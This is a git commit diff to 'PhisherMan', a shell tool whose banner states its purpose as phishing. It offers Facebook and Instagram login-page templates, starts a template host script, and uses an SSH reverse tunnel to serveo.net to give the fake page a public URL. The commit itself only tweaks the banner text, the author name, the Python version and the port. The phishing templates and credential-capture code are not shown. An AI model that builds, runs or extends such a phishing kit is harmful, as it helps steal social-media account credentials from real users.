ccd173bc374110ec1160416b5d30b8c7238e9a11
the-joker-guy <148836695+the-joker-guy@users.noreply.github.com>
2023-11-15 15:49:13 +0000

    Add files via upload

--- phisherman.sh
+++ phisherman.sh
@@ -9,7 +9,7 @@ PS1="\[\e[1m\]\$ \[\e[0m\]"
 # Function to display text as if it's being typed
 type_text() {
   local text="$1"
-  local delay="0.0000000000000000000000000000005"
+  local delay="0.0000000000005"
   local i=0
 
   while [ $i -lt ${#text} ]; do
@@ -27,24 +27,24 @@ type_text ""
 type_text ""
 type_text ""
 type_text ""
-type_text "            ------------------------------------  "
-type_text "            |           PHISHERMAN             |  "
-type_text "            ------------------------------------  "
-echo "            | Tool          | PhisherMan       |  "
-echo "            | Purpose       | Phishing         |  "
-echo "            | Author        | ABC Dior         |  "
-echo "            | Collaborators | None             |  "
-echo "            | Version       | 1.0              |  "
-type_text "            ------------------------------------  "
+type_text "          ------------------------------------  "
+type_text "          |           PHISHERMAN             |  "
+type_text "          ------------------------------------  "
+echo "          | Tool          | PhisherMan       |  "
+echo "          | Purpose       | Phishing         |  "
+echo "          | Author        | The Joker        |  "
+echo "          | Collaborators | None             |  "
+echo "          | Version       | 1.0              |  "
+type_text "          ------------------------------------  "
 
 echo
 type_text "           Type template number to select it. "
 type_text "           For example, type: 01 to select Facebook "
 
-echo "           | Code      |  Name               | "
-echo "           | 01        |  Facebook           | "
-echo "           | 02        |  Instagram          | "
-echo "           | Others    |  Coming soon        | "
+echo "          | Code      |  Name               | "
+echo "          | 01        |  Facebook           | "
+echo "          | 02        |  Instagram          | "
+echo "          | Others    |  Coming soon        | "
 echo
-python ".templates/host.py"
+python3 ".templates/host.py"
 exit 0
--- serveo_link.sh
+++ serveo_link.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-serveo_output=$(ssh -R 80:localhost:8080 serveo.net 2>&1 > serveo_output.txt &)
+serveo_output=$(ssh -R 80:localhost:2095 serveo.net 2>&1 > serveo_output.txt &)
 serveo_url=$(grep -o "https://.*" serveo_output.txt)
